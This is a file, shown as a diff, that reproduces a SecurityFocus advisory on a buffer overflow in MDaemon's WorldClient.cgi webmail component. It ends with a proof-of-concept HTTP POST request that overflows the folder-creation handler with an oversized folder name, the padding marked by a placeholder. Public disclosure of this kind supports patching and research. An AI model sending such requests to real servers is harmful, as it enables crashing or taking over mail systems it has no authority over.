@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/4689/info
+
+MDaemon is an integrated mail transport agent, webmail, and mail anti-virus package. It is available for Microsoft Windows operating systems.
+
+It may be possible for a remote user to take advantage of a buffer overflow in the MDaemon software package. The WorldClient.cgi program packaged with MDaemon does not properly check bounds on user-supplied data. During the process of creating a folder with a long name, it is possible to exploit a buffer overflow in the CGI that could result in the overwriting of process memory, and execution of attacker-supplied instructions.
+
+POST /WorldClient.cgi?Session=xxxx&View=Options-Folders&Reload=Yes HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)
+Host: victim:3000
+Content-Length: 1636
+Connection: Keep-Alive
+Cookie: User=MDaemon; Lang=en; Theme=Standard; Session=xxxxx
+
+OldFolderParent=&OldFolder=&FolderParent=&Folder=&NewFolder=AAAAAAAAAAAA
+AAA[BUFFER_HERE_1000+chars]&NewFolderParent=&Create=Create&Folder%3AInbo
+x=Inbox&Folder%3ADrafts=Drafts&Folder%3ASent=Sent&Folder%3ATrash=Trash&F
+older%3As=s
